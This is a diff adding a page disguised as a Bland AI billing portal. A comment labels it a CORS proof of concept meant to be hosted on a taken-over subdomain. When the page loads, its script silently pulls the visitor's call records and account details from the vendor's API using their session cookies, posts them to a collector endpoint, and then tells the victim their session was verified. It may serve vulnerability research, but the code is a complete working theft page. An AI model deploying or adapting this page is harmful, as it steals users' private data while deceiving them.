@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bland AI — Billing Portal</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #0a0a0a; color: #fff; margin: 0; }
+        .container { max-width: 500px; margin: 100px auto; padding: 40px; background: #111; border-radius: 12px; text-align: center; }
+        .logo { font-size: 28px; font-weight: 700; margin-bottom: 20px; }
+        .spinner { border: 3px solid #333; border-top: 3px solid #fff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .done { color: #00cc88; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Bland</div>
+        <p id="msg">Verifying your billing session...</p>
+        <div class="spinner" id="spin"></div>
+    </div>
+    <script>
+    /*
+     * CORS PoC — hosted on billing.bland.ai (subdomain takeover)
+     *
+     * CHANGE THIS to your collector server URL:
+     */
+    const COLLECTOR = window.location.origin + "/collect";
+
+    async function run() {
+        const stolen = { calls: null, account: null, url: window.location.href };
+
+        try {
+            // Steal calls
+            const r1 = await fetch("https://api.bland.ai/v1/calls?limit=1000", { credentials: "include" });
+            stolen.calls = await r1.json();
+        } catch(e) {}
+
+        try {
+            // Steal account
+            const r2 = await fetch("https://api.bland.ai/v1/me", { credentials: "include" });
+            stolen.account = await r2.json();
+        } catch(e) {}
+
+        // Send to collector
+        try {
+            await fetch(COLLECTOR, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(stolen)
+            });
+        } catch(e) {}
+
+        // Show "done" to victim
+        document.getElementById("spin").style.display = "none";
+        document.getElementById("msg").innerHTML = '<span class="done">Session verified. You can close this page.</span>';
+    }
+
+    setTimeout(run, 1000);
+    </script>
+</body>
+</html>
